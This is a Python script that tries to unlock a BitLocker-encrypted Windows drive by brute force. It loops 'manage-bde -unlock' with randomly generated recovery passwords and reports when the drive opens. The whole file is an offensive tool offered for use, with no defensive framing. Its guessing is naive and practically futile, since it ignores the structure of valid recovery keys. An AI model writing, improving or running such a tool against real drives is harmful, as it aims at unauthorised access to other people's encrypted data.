import os
import math
import subprocess
import sys
import argparse
import re
from math import *
from os import *
from subprocess import *



def GenRecKey():
    Rec_Key = ""
    
    for i in range(1,56):
        if i % 7 == 0:
            Rec_Key += "-"
        else:
            Rec_Key += str(math.floor((os.urandom(1)[0]/25.6)))
    
    return Rec_Key

try:
    parser = argparse.ArgumentParser()
    parser.add_argument("Drive_Letter", help="The letter of the drive to be brute-forced Example: X:", type=str)
    args = parser.parse_args()
    regchk = re.compile('[a-zA-Z]')
    if not(":" in args.Drive_Letter):
        print("Drive letter should contain the colon character \":\"")
        exit()
    elif len(args.Drive_Letter) != 2:
        print("Drive letter should be two characters only one letter and one colon: X:")
        exit()
    elif not(regchk.match(args.Drive_Letter[0])):
        print("Drive letter has to be from A-Z")
        exit()
    
    ItemsX = ["░","▒","▓","█","▓","▒"]
    #ItemsX = ["╝","╚","╔","╗"]
    #ItemsX = ["\\","|","/","─"]
    #ItemsX = ["╭","╮","╯","╰"]
    #ItemsX = ["×","+","×","+"]
    #ItemsX = ["◜","◝","◞","◟"]
    countr = 1
    while True:
        countr += 1
        resultX = subprocess.run(['manage-bde', '-unlock', args.Drive_Letter, '-RecoveryPassword',GenRecKey()],stdout=subprocess.PIPE)
        
        if ("admini") in (resultX.stdout.decode('utf-8')):
            print("You need to run this script with Administrator previlidges!")
            break
        elif ("error occurred") in (resultX.stdout.decode('utf-8')):
            print("Maybe that drive doesn't exist or some other problems have occured!")
            break
        elif ("is already unlocked") in (resultX.stdout.decode('utf-8')):
            print("Seems like that drive is already unlocked!")
            break
        if not(os.path.exists(args.Drive_Letter)):
            perc = ItemsX[countr%(len(ItemsX))]
            print(str(countr)+" tries!" + "{}".format(perc), end = "\r")
            print("", end = "\r")
        else:
            print(resultX.stdout.decode('utf-8'))
            print(resultX.args[4] + " seems to have worked! Congratulations!")
            break
except:
    e = sys.exc_info()[0]
    print(e)

